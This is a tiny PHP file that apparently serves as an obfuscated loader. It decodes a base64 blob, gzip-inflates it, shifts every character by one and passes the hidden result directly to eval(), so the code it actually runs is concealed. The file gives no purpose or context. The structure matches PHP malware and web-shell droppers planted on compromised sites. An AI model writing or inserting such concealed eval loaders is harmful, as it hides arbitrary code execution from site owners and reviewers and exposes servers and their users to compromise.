<?php

function cRPF($cHKoSS)
{
    $cHKoSS = gzinflate(base64_decode($cHKoSS));
    for ($i = 0; $i < strlen($cHKoSS); $i++) {
        $cHKoSS[$i] = chr(ord($cHKoSS[$i]) - 1);
    }
    return $cHKoSS;
}
eval(cRPF("U1QEAW7FtJTMAkXlwNy0pJI0xZLMpOI0xaxSxYqs0kzFqoKyYsX04qy0/NQSZRtuB3sA"));
